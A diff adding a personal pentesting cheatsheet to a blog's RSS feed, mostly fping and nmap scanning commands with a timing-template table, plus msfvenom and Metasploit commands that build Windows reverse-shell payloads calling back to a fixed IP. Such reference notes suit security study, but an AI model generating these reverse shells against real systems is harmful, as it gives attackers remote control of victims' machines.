@@ -142,6 +142,232 @@ Command and Control Framework Structure What is a Command and Control Framework 
     </item>
     
     <item>
+      <title>CHEATSHEET</title>
+      <link>//localhost:1313/cheatsheet/</link>
+      <pubDate>Thu, 02 May 2024 08:23:10 +0200</pubDate>
+      
+      <guid>//localhost:1313/cheatsheet/</guid>
+      <description>This is my pentesting cheatsheet.
+RECONNAISSANCE Fping fping differs from ping in that you can specify any number of targets on the command line, or specify a file containing the lists of targets to ping. fping also supports sending a specified number of pings to a target, or looping indefinitely (as in ping ). Unlike ping, fping is meant to be used in scripts, so its output is designed to be easy to parse.</description>
+      <content>&lt;p&gt;This is my &lt;strong&gt;pentesting cheatsheet&lt;/strong&gt;.&lt;/p&gt;
+&lt;div style=&#34;text-align: center;&#34;&gt;
+  &lt;img src=&#34;../img/hacking-614833260.gif&#34; alt=&#34;Image description&#34; style=&#34;display: block; margin: 0 auto;&#34; /&gt;
+&lt;/div&gt;
+&lt;h1 id=&#34;reconnaissance&#34;&gt;RECONNAISSANCE&lt;/h1&gt;
+&lt;h2 id=&#34;fping&#34;&gt;Fping&lt;/h2&gt;
+&lt;p&gt;fping differs from ping in that you can specify any number of targets on the command line, or specify a file containing the lists of targets to ping.
+fping also supports sending a specified number of pings to a target, or looping indefinitely (as in ping ). Unlike ping, fping is meant to be used in scripts, so its output is designed to be easy to parse.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;fping 10.4.23.227
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;nmap&#34;&gt;Nmap&lt;/h2&gt;
+&lt;h3 id=&#34;ping-sweep&#34;&gt;Ping Sweep&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo nmap -sn  192.168.56.0/24
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Scan mutlipe IP&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo nmap -sn  192.168.56.227 10.4.23.228 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Scan range of IP&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo nmap -sn 10.4.23.227-240
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Scan file with IP&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo nmap -sn -iL &amp;lt;filename&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;tcp-syn-ping&#34;&gt;TCP SYN Ping&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo nmap -sn -PS 10.4.23.227
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;To set range ports:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo nmap -sn -PS1-1000 10.4.23.227
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;To set multple ports:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo nmap -sn -PS80,3389,445 10.4.23.227
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;To perfom &lt;strong&gt;prot scan&lt;/strong&gt; with this technique simple remove &lt;strong&gt;-sn&lt;/strong&gt; flag&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo nmap -PS80,3389,445 10.4.23.227
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;tcp-ack-ping-scan&#34;&gt;TCP ACK Ping Scan&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo nmap -sn -PA 10.4.23.227
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo nmap -sn -PE 10.4.23.227 --send-ip
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;timing-templates&#34;&gt;Timing Templates&lt;/h3&gt;
+&lt;p&gt;This is the table where the &lt;strong&gt;-T0-4&lt;/strong&gt; flags are explained&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Timing templates and their effects&lt;/th&gt;
+&lt;th&gt;T0&lt;/th&gt;
+&lt;th&gt;T1&lt;/th&gt;
+&lt;th&gt;T2&lt;/th&gt;
+&lt;th&gt;T3&lt;/th&gt;
+&lt;th&gt;T4&lt;/th&gt;
+&lt;th&gt;T5&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;Name&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Paranoid&lt;/td&gt;
+&lt;td&gt;Sneaky&lt;/td&gt;
+&lt;td&gt;Polite&lt;/td&gt;
+&lt;td&gt;Normal&lt;/td&gt;
+&lt;td&gt;Aggressive&lt;/td&gt;
+&lt;td&gt;Insane&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;min-rtt-timeout&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;100 ms&lt;/td&gt;
+&lt;td&gt;100 ms&lt;/td&gt;
+&lt;td&gt;100 ms&lt;/td&gt;
+&lt;td&gt;100 ms&lt;/td&gt;
+&lt;td&gt;100 ms&lt;/td&gt;
+&lt;td&gt;50 ms&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;max-rtt-timeout&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;5 minutes&lt;/td&gt;
+&lt;td&gt;15 seconds&lt;/td&gt;
+&lt;td&gt;10 seconds&lt;/td&gt;
+&lt;td&gt;10 seconds&lt;/td&gt;
+&lt;td&gt;1250 ms&lt;/td&gt;
+&lt;td&gt;300 ms&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;initial-rtt-timeout&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;5 minutes&lt;/td&gt;
+&lt;td&gt;15 seconds&lt;/td&gt;
+&lt;td&gt;1 second&lt;/td&gt;
+&lt;td&gt;1 second&lt;/td&gt;
+&lt;td&gt;500 ms&lt;/td&gt;
+&lt;td&gt;250 ms&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;max-retries&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;10&lt;/td&gt;
+&lt;td&gt;10&lt;/td&gt;
+&lt;td&gt;10&lt;/td&gt;
+&lt;td&gt;10&lt;/td&gt;
+&lt;td&gt;6&lt;/td&gt;
+&lt;td&gt;2&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;Initial (and minimum) scan delay (&amp;ndash;scan-delay)&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;5 minutes&lt;/td&gt;
+&lt;td&gt;15 seconds&lt;/td&gt;
+&lt;td&gt;400 ms&lt;/td&gt;
+&lt;td&gt;0&lt;/td&gt;
+&lt;td&gt;0&lt;/td&gt;
+&lt;td&gt;0&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;Maximum TCP scan delay&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;5 minutes&lt;/td&gt;
+&lt;td&gt;15,000&lt;/td&gt;
+&lt;td&gt;1 second&lt;/td&gt;
+&lt;td&gt;1 second&lt;/td&gt;
+&lt;td&gt;10 ms&lt;/td&gt;
+&lt;td&gt;5 ms&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;Maximum UDP scan delay&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;5 minutes&lt;/td&gt;
+&lt;td&gt;15 seconds&lt;/td&gt;
+&lt;td&gt;1 second&lt;/td&gt;
+&lt;td&gt;1 second&lt;/td&gt;
+&lt;td&gt;1 second&lt;/td&gt;
+&lt;td&gt;1 second&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;host-timeout&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;0&lt;/td&gt;
+&lt;td&gt;0&lt;/td&gt;
+&lt;td&gt;0&lt;/td&gt;
+&lt;td&gt;0&lt;/td&gt;
+&lt;td&gt;0&lt;/td&gt;
+&lt;td&gt;15 minutes&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;script-timeout&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;0&lt;/td&gt;
+&lt;td&gt;0&lt;/td&gt;
+&lt;td&gt;0&lt;/td&gt;
+&lt;td&gt;0&lt;/td&gt;
+&lt;td&gt;0&lt;/td&gt;
+&lt;td&gt;10 minutes&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;min-parallelism&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Dynamic, not affected by timing templates&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;max-parallelism&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;1&lt;/td&gt;
+&lt;td&gt;1&lt;/td&gt;
+&lt;td&gt;1&lt;/td&gt;
+&lt;td&gt;Dynamic&lt;/td&gt;
+&lt;td&gt;Dynamic&lt;/td&gt;
+&lt;td&gt;Dynamic&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;min-hostgroup&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Dynamic, not affected by timing templates&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;max-hostgroup&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Dynamic, not affected by timing templates&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;min-rate&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;No minimum rate limit&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;max-rate&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;No maximum rate limit&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;defeat-rst-ratelimit&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Not enabled by default&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;hr&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;payloads&#34;&gt;Payloads&lt;/h1&gt;
+&lt;h2 id=&#34;msfvenom&#34;&gt;Msfvenom&lt;/h2&gt;
+&lt;h3 id=&#34;reverse-shell&#34;&gt;Reverse Shell&lt;/h3&gt;
+&lt;p&gt;Reverse shell in C format&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;192.168.131.154 LPORT&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;9500&lt;/span&gt; -f c
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Reverse shell in binary format&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;192.168.131.154 LPORT&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;443&lt;/span&gt; -f raw -o code.bin
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;c2-framework&#34;&gt;C2 Framework&lt;/h1&gt;
+&lt;h2 id=&#34;metasploit&#34;&gt;Metasploit&lt;/h2&gt;
+&lt;p&gt;While Metasploit is not a dedicated C2 framework, it can be used in conjunction with C2 capabilities for more advanced penetration testing and red teaming scenarios. Metasploit&amp;rsquo;s &lt;strong&gt;Meterpreter&lt;/strong&gt;, for instance, is a powerful payload that allows for interactive control over a compromised system, somewhat akin to C2 operations.&lt;/p&gt;
+&lt;p&gt;Use meterpreter for windows reverse shell&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;use payload/windows/x64/meterpreter_reverse_tcp
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
+    </item>
+    
+    <item>
       <title>WHOAMI</title>
       <link>//localhost:1313/whoami/</link>
       <pubDate>Thu, 02 May 2024 08:23:10 +0200</pubDate>
